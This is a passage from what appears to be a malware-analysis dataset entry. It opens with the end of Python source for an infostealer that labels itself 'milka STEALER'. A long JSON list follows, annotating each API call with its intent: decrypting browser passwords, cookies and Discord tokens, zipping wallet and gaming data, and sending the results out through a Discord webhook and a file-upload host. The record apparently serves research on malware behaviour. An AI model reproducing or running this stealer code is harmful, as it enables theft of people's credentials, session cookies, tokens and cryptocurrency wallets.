\"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"secret\"\n        ]\n\n    wikith = []\n    for patt in path2search: \n        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\n\n\nglobal keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip\n\nkeyword = [\n    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n]\n\nCookiCount, PasswCount = 0, 0\ncookiWords = []\npaswWords = []\n\nWalletsZip = [] # [Name, Link]\nGamingZip = []\nOtherZip = []\n\nGatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = Kiwi()\n\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n\n    filetext = \"\\n\"\n    for arg in KiwiFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]       \n            filetext += f\"ðŸ“ {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"â””â”€:open_file_folder: [{fileanme}]({b})\\n\"\n            filetext += \"\\n\"\n    upload(\"kiwi\", filetext)",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'TEMP'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request('https://api.ipify.org')",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "str.strip()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "__import__()",
              "action_description": "Dynamically imports specified module",
              "action_id": "import_dynamic",
              "object": "modl[0]",
              "object_description": "Module name string",
              "object_id": "module_name_string",
              "intention_description": "Import module dynamically",
              "intention_id": "import_module_dynamically"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "f\"{executable} -m pip install {modl[1]}\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "3",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "url, data=data",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "url, files=files",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "Request(hook, data=data, headers=headers)",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "Request(hook, data=data)",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(f\"https://geolocation-db.com/jsonp/{ip}\")",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "loads()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "ipdatanojson",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "\".google.com\", data",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Detect shortcut files",
              "intention_id": "detect_shortcut_files"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "loads()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "loads()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "loads()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "data",
              "object_description": "Webhook payload data",
              "object_id": "webhook_data",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "LoadUrlib()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "hook, data=dumps(data).encode(), headers=headers",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "\"(\\w+[a-z])\",listt",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Prepare character processing",
              "intention_id": "prepare_character_processing"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"TEMP\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, mode='w', encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"<--milka STEALER ON TOP-->\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f\"{path}\\{file}\", errors=\"ignore\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Prepare character processing",
              "intention_id": "prepare_character_processing"
            },
            {
              "action_api": "checkToken()",
              "action_description": "Checks validity of Discord token",
              "action_id": "check_discord_token",
              "object": "token",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "uploadToken()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "token, path",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "os.stat()",
              "action_description": "Retrieves file status",
              "action_id": "path_object_operations",
              "object": "pathC",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "pathC, tempfold",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sql_connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "tempfold",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT action_url, username_value, password_value FROM logins;\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser password data",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "tempfold",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathKey, 'r', encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "json_loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state['os_crypt']['encrypted_key']",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "DecryptValue()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "row[2], master_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "writeforfile()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "Passw, 'passw'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "pathC, tempfold",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sql_connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "tempfold",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT host_key, name, encrypted_value FROM cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "tempfold",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathKey, 'r', encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "json_loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state['os_crypt']['encrypted_key']",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "DecryptValue()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "row[2], master_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser cookie value",
              "intention_id": "decrypt_browser_cookie"
            },
            {
              "action_api": "writeforfile()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "Cookies, 'cook'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "f\"{path}/Local State\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathKey, 'r', encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "json_loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state['os_crypt']['encrypted_key']",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "token.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "DecryptValue()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt Discord token",
              "intention_id": "decrypt_discord_token"
            },
            {
              "action_api": "checkToken()",
              "action_description": "Checks validity of Discord token",
              "action_id": "check_discord_token",
              "object": "tokenDecoded",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "uploadToken()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "tokenDecoded, path",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=ZipThings, args=[patt[0], patt[5], patt[1]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Prepare thread pool for concurrent execution",
              "intention_id": "concurrent_execution_preparation"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "f\"taskkill /im {procc} /t /f >nul 2>&1\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "f\"{pathC}/{name}.zip\", \"w\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "zf.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "pathC + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zf.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "f'{pathC}/{name}.zip'",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "uploadToAnonfiles()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "f'{pathC}/{name}.zip'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathC",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=KiwiFile, args=[patt, key_wordsFiles]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Prepare thread pool for concurrent execution",
              "intention_id": "concurrent_execution_preparation"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "upload()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "\"kiwi\", filetext",
              "object_description": "Webhook payload data",
              "object_id": "webhook_data",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            }
          ]
        }
      ]
    }
  ]
}